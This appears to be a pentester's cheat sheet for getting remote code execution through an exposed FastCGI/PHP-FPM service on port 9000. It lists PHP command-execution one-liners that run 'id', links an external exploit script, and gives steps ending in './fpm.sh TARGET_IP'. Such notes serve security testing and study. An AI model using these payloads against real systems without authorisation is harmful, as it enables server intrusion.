# FastCGI

Port: 9000

Link: https://book.hacktricks.wiki/en/network-services-pentesting/9000-pentesting-fastcgi.html

Python script: https://gist.githubusercontent.com/phith0n/9615e2420f31048f7e30f3937356cf75/raw/ffd7aa5b3a75ea903a0bb9cc106688da738722c5/fpm.py

## PHP Code execution functions

Passthru

    <?php passthru('id');?>

System

    <?php system('id');?>

Exec

    <?php exec('id');?>

Shell_exec

    <?php shell_exec('id');?>

Popen

    <?php popen('id', 'r');?>

Proc_open

    <?php proc_open('id',[],0);?>

Pcntl_exec

    <?php pcntl_exec('/usr/bin/id');?>

Use functions with Print_r

    <?php print_r(exec('id'));?>

Use functions with echo

    <?php echo shell_exec('id');?>
    
### 1) Modify hacktricks script according the target

### 2) Achieve RCE using hacktricks script

    ./fpm.sh TARGET_IP
